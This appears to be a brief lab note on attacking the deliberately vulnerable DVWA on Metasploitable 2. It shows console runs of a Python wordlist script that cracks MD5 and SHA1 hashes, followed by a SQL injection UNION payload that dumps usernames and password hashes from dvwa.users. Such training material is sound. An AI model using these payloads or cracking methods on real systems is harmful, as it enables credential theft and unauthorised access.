# Cracking Password Hashes With Python - POSTEXPLOIT Attack

- Metasploitable 2<br/>
    http://<Metasploitable 2 IP>/dvwa/index.php

- Testing<br/>
    - Search **MD5 Encryption**<br/>
        建立加密後的MD5密碼，如 5f4dcc3b5aa765d61d8327deb882cf99

    - Search **SHA1 Encryption**<br/>
        建立加密後的SHA1密碼，如 9bc34549d565d9505b287de0cd20ac77be1d3f2c

        ```python
        $ python cracker_password.py 
        Which type of hash you want to bruteforce? md5
        Enter path to the file to bruteforce with: passwordlist.txt
        Enter hash value to bruteforce: 5f4dcc3b5aa765d61d8327deb882cf99
        Found MD5 password: password
        ```

        ```python
        $ python cracker_password.py
        Which type of hash you want to bruteforce? sha1
        Enter path to the file to bruteforce with: passwordlist.txt
        Enter hash value to bruteforce: 9bc34549d565d9505b287de0cd20ac77be1d3f2c
        Found SHA1 password: test1234
        ```

# SQL injection

- Metasploitable DVWA - SQL injection
    ``` SQL
    2' UNION SELECT CONCAT(user_id,'-',first_name,' ',last_name), CONCAT(user,':',password) FROM dvwa.users #'
    ```
